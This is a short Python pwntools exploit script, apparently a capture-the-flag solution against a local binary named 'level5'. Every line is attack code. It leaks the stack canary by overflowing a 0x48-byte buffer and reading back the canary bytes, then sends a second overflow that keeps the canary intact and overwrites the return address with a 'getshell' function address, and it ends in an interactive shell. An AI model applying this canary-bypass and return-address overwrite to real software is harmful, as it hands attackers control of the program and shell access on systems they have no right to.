#coding:utf-8
from pwn import *

getshell_addr = 0x00000000004006B6

p = process('./level5')

padding = 'A'*0x48

p.recvuntil('first\n')
p.send(padding + 'F')
p.recvuntil(padding + 'F')
data = p.recv(7)
data = (chr(0) + data).ljust(8, '\x00')
canary = u64(data)

p.recvuntil('second\n')
payload = padding + p64(canary) + 'B'*0x08 + p64(getshell_addr)
p.send(payload)

p.interactive()



